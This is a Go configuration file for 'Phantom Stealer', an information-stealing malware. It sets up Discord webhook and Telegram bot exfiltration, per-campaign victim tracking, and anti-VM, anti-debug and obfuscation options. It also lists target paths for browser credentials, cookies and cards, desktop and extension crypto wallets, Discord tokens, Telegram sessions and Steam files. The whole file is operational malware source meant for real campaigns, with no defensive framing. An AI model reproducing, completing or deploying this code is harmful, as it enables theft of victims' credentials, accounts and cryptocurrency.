package config

// ============================================================
// PHANTOM STEALER CONFIGURATION
// ============================================================
// Change these values before building!
// Remember to use garble or similar for the webhook URL
// ============================================================

// C2 Configuration
// -----------------
// Set your webhook/bot details here
// At least one should be configured or exfil will fail

var (
	// Discord webhook - PRIMARY exfil method
	// format: https://discord.com/api/webhooks/xxxxx/yyyyy
	DiscordWebhook = ""

	// Telegram bot - BACKUP exfil method
	// only used if discord fails or isn't set
	TelegramToken  = ""
	TelegramChatID = "" // get this from @userinfobot
)

// Build Info
// ----------
// Change BuildID for each campaign to track victims
var (
	BuildID   = "phantom-v1.0"
	MutexName = "phantom_mtx_7f3a9b2c" // change this to avoid detection by mutex scanners
)

// Module Toggles
// --------------
// Enable/disable features as needed
// More modules = more data but also more sus behavior
var (
	StealBrowsers  = true // passwords, cookies, cards, history
	StealCrypto    = true // desktop + extension wallets
	StealDiscord   = true // discord tokens
	StealTelegram  = true // tdata session files
	StealSteam     = true // ssfn + config files
	TakeScreenshot = true // png screenshot
	GrabSystemInfo = true // hostname, ip, specs, etc

	// DANGER ZONE - these are noisier
	Persistence  = false // off by default - adds to registry/startup
	SelfDestruct = false // delete exe after run

	// Anti-analysis
	// recommended to keep both on for prod builds
	AntiVM    = true
	AntiDebug = true

	// File grabber settings
	FileGrabber    = true
	FileExtensions = []string{
		// documents
		".txt", ".doc", ".docx", ".xls", ".xlsx",
		".pdf", ".json", ".csv",
		// databases
		".db", ".sqlite",
		// crypto/keys
		".key", ".pem", ".ppk", ".kdbx",
		// configs
		".rdp", ".ovpn", ".conf",
		// wallet files
		".wallet", ".dat",
	}
	MaxFileSize  = int64(5 * 1024 * 1024) // 5MB - dont grab huge files
	GrabberPaths = []string{
		"Desktop",
		"Documents",
		"Downloads",
		// could add more but these have the goods usually
	}
)

// ============================================================
// TARGET DEFINITIONS
// ============================================================
// Desktop wallets and their paths
// Most of these are relative to %APPDATA% or %LOCALAPPDATA%

var WalletTargets = map[string]string{
	// popular ones first
	"Exodus":   "AppData\\Roaming\\Exodus\\exodus.wallet",
	"Electrum": "AppData\\Roaming\\Electrum\\wallets",
	"Atomic":   "AppData\\Local\\atomic\\Local Storage\\leveldb",
	"Jaxx":     "AppData\\Roaming\\Jaxx\\Local Storage\\leveldb", // jaxx is deprecated but ppl still use it
	"Coinomi":  "AppData\\Local\\Coinomi\\Coinomi\\wallets",
	"Guarda":   "AppData\\Roaming\\Guarda\\Local Storage\\leveldb",

	// core wallets - these have wallet.dat
	"BitcoinCore":  "AppData\\Roaming\\Bitcoin\\wallets",
	"LitecoinCore": "AppData\\Roaming\\Litecoin\\wallets",
	"DashCore":     "AppData\\Roaming\\DashCore\\wallets",

	// privacy coins
	"Monero": "Documents\\Monero\\wallets", // weird location but ok
	"ZCash":  "AppData\\Roaming\\Zcash",
	"Wasabi": "AppData\\Roaming\\WalletWasabi\\Client\\Wallets", // for the privacy nerds
}

// Browser extension wallet IDs
// These are the chrome extension IDs - same for edge/brave/etc
// Found most of these by just googling lol
var ExtensionTargets = map[string]string{
	// big ones everyone uses
	"Metamask":     "nkbihfbeogaeaoehlefnkodbefgpgknn",
	"TronLink":     "ibnejdfjmmkpcnlpebklmnkoeoihofec",
	"BinanceChain": "fhbohimaelbohpjbbldcngcnapndodjp",
	"Coin98":       "aeachknmefphepccionboohckonoeemg",
	"Phantom":      "bfnaelmomeimhlpmgjnjophhpkkoljpa", // solana

	// more popular ones
	"Terra":       "aiifbnbfobpmeekipheeijimdpnlpgpp",
	"Keplr":       "dmkamcknogkgcdfhhbddcghachkejeap", // cosmos
	"Sollet":      "fhmfendgdocmcbmfikdcogofphimnkno",
	"Slope":       "pocmplpaccanhmnllbbkpgfliimjljgo",
	"Starcoin":    "mfhbebgoclkghebffdldpobeajmbecfk",
	"Swash":       "cmndjbecilbocjfkibfbifhngkdmjgog",
	"Finnie":      "cjmkndjhnagcfbpiemnkdpomccnjblmj",
	"XDEFI":       "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
	"BitKeep":     "jiidiaalihmmhddjgbnbgdfflelocpak",
	"iWallet":     "kncchdigobghenbbaddojjnnaogfppfj",
	"Wombat":      "amkmjjmmflddogmhpjloimipbofnfjih",
	"Oxygen":      "fhilaheimglignddkjgofkcbgekhenbh",
	"BraveWallet": "odbfpeeihdkbihmopkbjmoonfanlbfcl",
	"Ronin":       "fnjhmkhhmkbjkkabndcnnogagogbneec", // axie infinity
	"MEWcx":       "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
	"TON":         "nphplpgoakhhjchkkhmiggakijnkhfnd",
	"Coinbase":    "hnfanknocfeofbddgcijnmhnfnkdnaad",
	"Math":        "afbcbjpbpfadlkmhmclhkeeodmamcflc",
	"NeoLine":     "cphhlgmgameodnhkjdmkpanlelnlohao",
	"KHC":         "hcflpincpppdclinealmandijcmnkbgn",
	"OneKey":      "infeboajgfhgbjpjbeppbkgnabfdkdaf",
	"Trust":       "egjidjbpglichdcondbcbdnbeeppgdph",
	"Hashpack":    "gjagmgiddbbciopjhllkdnddhcglnemk",
	"GuildWallet": "nanjmdknhkinifnkgdcggcfnhdaammmj",
	"GeroWallet":  "bgpipimickeadkjlklgciifhnalhdjhe",
	"Clover":      "nhnkbkgjikgcigadomkphalanndcapjk",
	"Halo":        "ocdciohofkgohmibehfoijjbkfgobpob",
	// TODO: add more as i find them
}

// Discord token paths
// Both app installations and browser sessions
// gotta check all of these unfortunately
var DiscordPaths = []string{
	// Desktop clients
	"AppData\\Roaming\\discord\\Local Storage\\leveldb",
	"AppData\\Roaming\\discordcanary\\Local Storage\\leveldb",
	"AppData\\Roaming\\discordptb\\Local Storage\\leveldb",
	"AppData\\Local\\Discord\\Local Storage\\leveldb",
	"AppData\\Local\\DiscordCanary\\Local Storage\\leveldb",
	"AppData\\Local\\DiscordPTB\\Local Storage\\leveldb",

	// Browser sessions (for web discord users)
	"AppData\\Roaming\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
	"AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb", // gamers love opera gx
	"AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
	"AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
	"AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
	"AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
}

// Browser paths for credential extraction
// BrowserConfig contains path info for each browser we target
var BrowserPaths = map[string]BrowserConfig{
	"Chrome": {
		Path:    "AppData\\Local\\Google\\Chrome\\User Data",
		Profile: "Default",
		Type:    "chromium",
	},
	"Edge": {
		Path:    "AppData\\Local\\Microsoft\\Edge\\User Data",
		Profile: "Default",
		Type:    "chromium",
	},
	"Brave": {
		Path:    "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
		Profile: "Default",
		Type:    "chromium",
	},
	"Opera": {
		Path:    "AppData\\Roaming\\Opera Software\\Opera Stable",
		Profile: "", // opera is weird, no profile subfolder
		Type:    "chromium",
	},
	"OperaGX": {
		Path:    "AppData\\Roaming\\Opera Software\\Opera GX Stable",
		Profile: "",
		Type:    "chromium",
	},
	"Vivaldi": {
		Path:    "AppData\\Local\\Vivaldi\\User Data",
		Profile: "Default",
		Type:    "chromium",
	},
	"Yandex": {
		Path:    "AppData\\Local\\Yandex\\YandexBrowser\\User Data",
		Profile: "Default",
		Type:    "chromium",
	},
	"Chromium": {
		Path:    "AppData\\Local\\Chromium\\User Data",
		Profile: "Default",
		Type:    "chromium",
	},
	// firefox is different - uses its own encryption
	"Firefox": {
		Path:    "AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
		Profile: "",
		Type:    "firefox",
	},
	"Waterfox": {
		Path:    "AppData\\Roaming\\Waterfox\\Profiles",
		Profile: "",
		Type:    "firefox",
	},
}

type BrowserConfig struct {
	Path    string
	Profile string
	Type    string // "chromium" or "firefox"
}

// ============================================================
// RUNTIME STUFF - don't touch
// ============================================================

// XOR key derived from hostname at runtime
// makes static analysis harder since key isn't in the binary
var xorKey []byte

func SetKey(key []byte) {
	xorKey = key
}

func GetKey() []byte {
	return xorKey
}
